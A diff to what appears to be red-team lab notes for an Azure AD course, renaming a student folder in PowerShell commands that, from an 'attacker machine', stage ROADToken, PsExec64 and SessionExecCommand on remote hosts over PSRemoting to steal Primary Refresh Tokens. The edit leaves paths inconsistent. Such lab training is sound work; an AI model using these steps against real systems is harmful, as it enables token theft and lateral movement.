@@ -1260,22 +1260,22 @@ How do we know which user's PRT is available?
 #### Session play
 Using the PSRemoting session to jumpvm, create a directory/folder on infradminsrv:
 ```
-Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\studentx}
+Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\student213}
 exit
 ```
 
 Now let's copy over some tools to the jumpvm. **Remember to do this from the attacker machine**, not the PSRemoting session: 
 ```
-Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose 
-Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose 
-Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student213\jumpvm\Documents –Verbose 
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student213\jumpvm\Documents –Verbose 
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student213\jumpvm\Documents –Verbose
 ```
 
 Now, connect back to jumpvm and now copy tools to infradminsrv using the PSRemoting Session that we created earlier: 
 ```
-Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\ROADToken.exe -Destination C:\Users\Public\studentx –Verbose
-Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\PsExec64.exe -Destination C:\Users\Public\studentx –Verbose
-Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\SessionExecCommand.exe -Destination C:\Users\Public\studentx –Verbose
+Copy-Item -ToSession $infradminsrv -Path C:\Users\student213\jumpvm\Documents\ROADToken.exe -Destination C:\Users\Public\studentx –Verbose
+Copy-Item -ToSession $infradminsrv -Path C:\Users\student213\jumpvm\Documents\PsExec64.exe -Destination C:\Users\Public\studentx –Verbose
+Copy-Item -ToSession $infradminsrv -Path C:\Users\student213\jumpvm\Documents\SessionExecCommand.exe -Destination C:\Users\Public\studentx –Verbose
 ```
 
 Check if all the files are copied properly: 
